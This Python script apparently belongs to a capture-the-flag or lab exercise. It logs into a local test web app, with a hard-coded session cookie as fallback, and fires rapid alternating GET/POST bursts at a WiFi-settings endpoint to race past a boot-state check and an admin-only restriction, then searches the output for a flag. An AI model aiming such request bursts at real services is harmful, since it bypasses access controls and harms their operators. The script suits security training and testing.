import requests
import time

# Target configuration
BASE_URL = "http://127.0.0.1:32992"
LOGIN_URL = f"{BASE_URL}/login"
WIFI_URL = f"{BASE_URL}/wifi_settings"

# Authentication credentials
USERNAME = "test"
PASSWORD = "test"

# Attack configuration
TOTAL_GET = 100
TOTAL_POST = 100

print("[*] Starting Race Condition Attack: Rapid Sequential Mixed GET/POST Burst")
print(f"[*] Configuration: {TOTAL_GET} GET + {TOTAL_POST} POST requests")

# Step 1: Authenticate and establish session
print("\n[1] Authenticating...")
session = requests.Session()

# Login and follow redirects to establish session properly
login_resp = session.post(LOGIN_URL, data={'username': USERNAME, 'password': PASSWORD}, allow_redirects=True)
print(f"    Login status: {login_resp.status_code}")
print(f"    History: {[h.status_code for h in login_resp.history]}")

# Check cookies after redirects
cookies = session.cookies.get_dict()
print(f"    Session cookies: {cookies}")

if 'session' not in cookies:
    # Try to force use the context session
    print("[!] Using pre-existing session cookie from context")
    session.cookies.set('session', 'ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8')
    cookies = {'session': 'ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8'}

# Test the session with a GET first
print("\n[2] Testing session with GET /wifi_settings...")
test_resp = session.get(WIFI_URL)
print(f"    Test GET status: {test_resp.status_code}")
test_text = test_resp.text
has_boot_test = "WiFi chipset is still booting" in test_text
print(f"    Has boot error (GET): {has_boot_test}")
print(f"    Response preview: {test_text[:300]}")

# Prepare request queue - alternating GET/POST
request_queue = []
for i in range(max(TOTAL_GET, TOTAL_POST)):
    if i < TOTAL_GET:
        request_queue.append(('GET', i))
    if i < TOTAL_POST:
        request_queue.append(('POST', i))

print(f"\n[3] Prepared {len(request_queue)} requests in alternating sequence")

# Results tracking
all_results = []
results = {
    'GET': {'success': 0, 'boot_error': 0, 'other': 0},
    'POST': {'success': 0, 'boot_error': 0, 'other': 0}
}

# Step 3: Execute rapid sequential burst
print("\n[4] Executing rapid sequential burst...")
start_time = time.time()

for req_type, req_id in request_queue:
    try:
        if req_type == 'GET':
            resp = session.get(WIFI_URL, timeout=5)
        else:  # POST
            resp = session.post(
                WIFI_URL,
                data={'ssid': 'test', 'channel': '6', 'mode': 'g'},
                timeout=5
            )
        
        response_text = resp.text
        status_code = resp.status_code
        
        # Analyze response
        has_boot_error = "WiFi chipset is still booting" in response_text
        has_auth_error = "Only administrator users" in response_text
        
        # Check for success
        success_keywords = ['success', 'flag', 'updated', 'saved', 'configured']
        has_success = any(kw in response_text.lower() for kw in success_keywords)
        
        result = {
            'type': req_type,
            'id': req_id,
            'status': status_code,
            'length': len(response_text),
            'has_boot_error': has_boot_error,
            'has_auth_error': has_auth_error,
            'has_success': has_success,
            'text': response_text[:1000] if len(response_text) > 1000 else response_text
        }
        
        all_results.append(result)
        
        if has_boot_error:
            results[req_type]['boot_error'] += 1
        elif has_auth_error:
            results[req_type]['other'] += 1
        elif req_type == 'POST' and not has_boot_error:
            results[req_type]['success'] += 1
        else:
            results[req_type]['other'] += 1
            
    except Exception as e:
        all_results.append({'type': req_type, 'id': req_id, 'error': str(e)})

elapsed = time.time() - start_time
rate = len(request_queue) / elapsed

print(f"\n[5] Attack completed in {elapsed:.2f}s ({rate:.1f} req/s)")

# Analyze results
print("\n" + "="*60)
print("RESULTS SUMMARY")
print("="*60)

print(f"\nTotal requests executed: {len([r for r in all_results if 'error' not in r])}")

print(f"\n--- GET Results ---")
print(f"  Boot errors: {results['GET']['boot_error']}")
print(f"  Success indicators: {results['GET']['success']}")
print(f"  Other: {results['GET']['other']}")

print(f"\n--- POST Results ---")
print(f"  Boot errors: {results['POST']['boot_error']}")
print(f"  Success indicators: {results['POST']['success']}")
print(f"  Other: {results['POST']['other']}")

# Find winning POSTs (no boot error)
print("\n" + "="*60)
print("WINNING RESPONSES ANALYSIS")
print("="*60)

winning_posts = [r for r in all_results 
                 if r.get('type') == 'POST' 
                 and not r.get('has_boot_error', True) 
                 and not r.get('has_auth_error', False)]

print(f"\nPOST requests WITHOUT boot error: {len(winning_posts)}")

if winning_posts:
    print(f"\n[!] FOUND {len(winning_posts)} successful POST responses!")
    for i, wr in enumerate(winning_posts[:5]):
        print(f"\n  --- Win #{i+1} (POST #{wr['id']}) ---")
        print(f"  Status: {wr['status']}")
        print(f"  Length: {wr['length']} bytes")
        print(f"  Has success: {wr['has_success']}")
        print(f"  Response:\n{wr['text'][:1200]}")
else:
    print("  No POST responses without boot errors")

# Check for FLAG
print("\n" + "="*60)
print("FLAG SEARCH")
print("="*60)

flag_found = False
for r in all_results:
    if 'text' in r and 'FLAG' in r['text'].upper():
        flag_found = True
        print(f"\n[!] FLAG FOUND in {r['type']} #{r['id']}!")
        print(f"    {r['text']}")

if not flag_found:
    print("  No FLAG found")

# Sample boot errors
print("\n" + "="*60)
print("SAMPLE BOOT ERROR RESPONSES")
print("="*60)

boot_errors = [r for r in all_results if r.get('has_boot_error') and r.get('type') == 'POST'][:3]
for i, r in enumerate(boot_errors):
    print(f"\n  Sample #{i+1} (POST #{r['id']}):")
    print(f"  {r['text'][:600]}")

# Final summary
print("\n" + "="*60)
print("FINAL VERDICT")
print("="*60)
print(f"Execution time: {elapsed:.2f}s")
print(f"Request rate: {rate:.1f} req/s")
print(f"POST successes (no boot error): {len(winning_posts)}/{TOTAL_POST}")
print(f"FLAG found: {flag_found}")

if len(winning_posts) > 0:
    print(f"\n[!] RACE CONDITION EXPLOITED: {len(winning_posts)} POSTs bypassed boot check!")
else:
    print(f"\n[-] All POSTs returned boot errors - state confusion strategy failed")
print("="*60)

